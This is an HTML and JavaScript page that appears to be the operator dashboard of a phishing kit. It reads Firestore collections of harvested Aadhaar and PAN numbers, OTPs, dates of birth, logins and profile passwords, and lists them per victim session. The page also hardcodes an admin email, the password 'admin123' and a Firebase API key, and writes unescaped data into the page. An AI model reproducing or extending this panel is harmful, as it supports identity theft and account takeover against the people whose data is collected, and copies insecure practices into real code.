<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Firebase Admin Panel</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f4f4f4; }
    .login-form {
      max-width: 300px; margin: 100px auto;
      background: white; padding: 20px;
      border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .login-form input, .login-form button {
      width: 100%; margin-bottom: 10px; padding: 10px;
      border-radius: 5px; border: 1px solid #ccc;
    }
    .login-form button {
      background: #00008b; color: white; border: none;
    }
    .container { padding: 20px; max-width: 100%; margin: auto; }
    h1 { text-align: center; color: #00008b; }
    .panel-layout { display: flex; flex-direction: column; gap: 20px; }
    .section {
      background: white; padding: 15px;
      border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      max-height: 600px; overflow-y: auto;
    }
    h2 {
      margin: 0; padding: 10px;
      background: #00008b; color: white;
      border-radius: 5px;
    }
    .group {
      margin-top: 20px;
      border: 2px solid #00008b;
      border-radius: 10px;
      padding: 10px;
      background: #f9f9f9;
    }
    .entry {
      background: white;
      padding: 10px;
      margin-top: 10px;
      border-left: 5px solid #00008b;
      position: relative;
    }
    pre {
      margin: 0;
      font-size: 14px;
      white-space: pre-wrap;
      word-wrap: break-word;
    }
    .time {
      font-size: 12px;
      color: #666;
      margin-top: 5px;
    }
  </style>
</head>
<body>
  <div id="login" class="login-form">
    <h3>Admin Login</h3>
    <input type="email" id="email" placeholder="Email" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="login()">Login</button>
  </div>

  <div class="container" id="adminPanel" style="display:none;">
    <h1>Firebase Admin Panel</h1>
    <div class="panel-layout">
      <div class="section">
        <h2>ALL DATA (Session Wise)</h2>
        <div id="allDataContent"></div>
      </div>
    </div>
  </div>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCxRO9k9P6dzovbF0OugNzp1TF1yuAY1Xg",
      authDomain: "welcomingrewd.firebaseapp.com",
      projectId: "welcomingrewd",
      storageBucket: "welcomingrewd.firebasestorage.app",
      messagingSenderId: "33456614906",
      appId: "1:33456614906:web:b5828e5dcb0253cace0843"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const collections = [
      'aadhaar_entries',
      'dob_entries',
      'logins',
      'otp_entries',
      'pan_entries',
      'profile_passwords'
    ];

    function login() {
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();
      if (email === "marconlinehoga@gmail.com" && password === "admin123") {
        document.getElementById("login").style.display = "none";
        document.getElementById("adminPanel").style.display = "block";
        loadAllData();
      } else {
        alert("Invalid credentials");
      }
    }

    async function loadAllData() {
      const sessionData = {};

      for (const col of collections) {
        const snapshot = await db.collection(col).orderBy('timestamp', 'desc').get();
        snapshot.forEach(doc => {
          const data = doc.data();
          const sessionId = data.sessionId || "no_session";
          if (!sessionData[sessionId]) {
            sessionData[sessionId] = [];
          }
          sessionData[sessionId].push({ ...data, __collection: col });
        });
      }

      renderGroupedData(sessionData);
    }

    function renderGroupedData(sessionData) {
      const container = document.getElementById("allDataContent");
      container.innerHTML = "";

      const sessions = Object.keys(sessionData).sort((a, b) => b.localeCompare(a));

      sessions.forEach(sessionId => {
        const group = document.createElement("div");
        group.className = "group";
        group.innerHTML = `<h3>Session ID: ${sessionId}</h3>`;

        sessionData[sessionId].sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));

        sessionData[sessionId].forEach(data => {
          const entry = document.createElement("div");
          entry.className = "entry";

          let cleanData = "";
          for (const key in data) {
            if (!['timestamp', '__collection', 'sessionId', 'captcha', '__collection', 'attempt', 'valid'].includes(key)) {
              cleanData += `${key} ${data[key]}\n`;
            }
          }

          const time = data.timestamp?.seconds ? new Date(data.timestamp.seconds * 1000).toLocaleString() : "No Time";

          entry.innerHTML = `<pre>[${data.__collection.toUpperCase()}]\n${cleanData.trim()}</pre>
                             <div class="time">${time}</div>`;
          group.appendChild(entry);
        });

        container.appendChild(group);
      });
    }
  </script>
</body>
</html>